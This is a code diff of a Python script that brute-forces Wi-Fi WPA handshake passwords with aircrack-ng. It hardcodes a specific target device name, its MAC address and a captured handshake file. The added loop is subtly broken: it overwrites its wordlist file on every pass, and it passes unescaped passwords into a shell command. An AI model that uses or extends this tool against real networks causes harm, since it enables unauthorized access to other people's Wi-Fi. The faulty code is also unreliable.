@@ -1,6 +1,7 @@
 import itertools
 import subprocess
 import os
+import tempfile
 from time import sleep
 from colr import Colr as colr
 
@@ -98,34 +99,41 @@ def aircrack_ng(handshake_path, wordlist_path):
 
 
 # generate wordlists keyword
-def generate_wordlist(min_length, max_length):
+def generate_passwords(min_length, max_length):
     characters = (
         "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"
     )
-    wordlist = []
     for length in range(min_length, max_length + 1):
         for combination in itertools.product(characters, repeat=length):
-            wordlist.append("".join(combination))
-    return wordlist
+            yield "".join(combination)
 
 
-# Save the generated password one by one to the file
-def save_to_file(wordlist, filename):
-    with open(filename, "w") as file:
-        for word in wordlist:
-            file.write(word + "\n")
+def crack_handshake(handshake_file):
+    try:
+        try:
+            Colors.blue("")
+            cmd = [
+                "aircrack-ng",
+                "-w",
+                "wordlist.txt",  # Read passwords from stdin
+                handshake_file,
+            ]
+            result = subprocess.run(cmd)
 
-    print(
-        colr().hex(
-            "#0000ff",
-            f"\n Wordlist generated with {colr().hex('#ff0000',len(wordlist),rgb_mode=True)}{colr().hex('#0000ff',' words.',rgb_mode=True)} ",
-            rgb_mode=True,
-        )
-    )
+        except KeyboardInterrupt:
+            Colors.red("\n\n______KeyboardInterrupted_____")
+        # Check if the process exited with an error
+        if result.returncode != 0:
+            print(f"Error occurred while cracking password: {result.stderr}")
+        else:
+            print(result.stdout)
+
+    except Exception as e:
+        print(f"An error occurred: {e}")
 
 
 # Main Choice
-def choice():
+def choices():
     null = ""
     dash = null.center(83, "-")
 
@@ -166,41 +174,54 @@ def choice():
     Colors.light_blue("\n Select One of the give option ?")
 
     try:
-        try:
-            choice = input(colr().hex("#ff0000", " > "))
-            choice = int(choice)
-            if choice == 1:
-                sleep(0.5)
-                min_length = input(colr().hex("#6666ff", " Minimum Length > "))
-                min_length = int(min_length)
-                sleep(0.5)
-                max_length = input(colr().hex("#6666ff", " Maximum Length > "))
-                max_length = int(max_length)
-                sleep(0.5)
-                filename = input(colr().hex("#6666ff", " Enter your filename > "))
-                filename = str(filename)
-                sleep(0.5)
-                # calling the generate_wordlist
-                wordlist = generate_wordlist(min_length, max_length)
-                # calling the save to file to save the wordlist that we created
-                save_to_file(wordlist, filename)
-            elif choice == 2:
-                sleep(0.5)
-                handshake_path = input(colr().hex("#6666ff", " Handshake Path > "))
-                sleep(0.5)
-                wordlist_path = input(colr().hex("#6666ff", " Wordlist Path > "))
-                sleep(0.5)
-                # call the aircrack-ng
-                aircrack_ng(handshake_path, wordlist_path)
-            elif choice == 3:
-                Operators.exit()
-            # else:
-            #     Operators.case_default()
-        except ValueError:
+        choice = input(colr().hex("#ff0000", " > "))
+        if choice == "1":
+            sleep(0.5)
+            min_length = input(colr().hex("#6666ff", " Minimum Length > "))
+            min_length = int(min_length)
+            sleep(0.5)
+            max_length = input(colr().hex("#6666ff", " Maximum Length > "))
+            max_length = int(max_length)
+            device_name = "Pocox4Pro5G"
+            sleep(0.5)
+            # Colors.red(
+            #     "\n Copy this : handshake/handshake_POCOX4Pro5G_4A-B0-7F-21-B6-A3_2023-07-03T21-08-32.cap \n"
+            # )
+            # handshake_path = input(colr().hex("#6666ff", " Handshake Path > "))
+            sleep(0.5)
+            # calling the generate_wordlist
+            for password in generate_passwords(min_length, max_length):
+                password = str(password)
+
+                os.system(
+                    f"echo 'Device Name : {device_name}\nPassword : {password}' > wordlist.txt"
+                )
+                print(
+                    colr().hex("#6666ff", "Checking Password: ", rgb_mode=True),
+                    colr().hex("#ff0000", password, rgb_mode=True),
+                )
+
+            crack_handshake(
+                "handshake/handshake_POCOX4Pro5G_4A-B0-7F-21-B6-A3_2023-07-03T21-08-32.cap"
+            )
+            choices()
+        elif choice == "2":
+            sleep(0.5)
+            handshake_path = input(colr().hex("#6666ff", " Handshake Path > "))
+            sleep(0.5)
+            wordlist_path = input(colr().hex("#6666ff", " Wordlist Path > "))
+            sleep(0.5)
+            # call the aircrack-ng
+            aircrack_ng(handshake_path, wordlist_path)
+            choices()
+        elif choice == "3":
+            Operators.exit()
+        else:
             Operators.case_default()
+
     except KeyboardInterrupt:
         Colors.red("\n\n______KeyboardInterrupted_____")
 
 
 # Call choice function
-choice()
+choices()
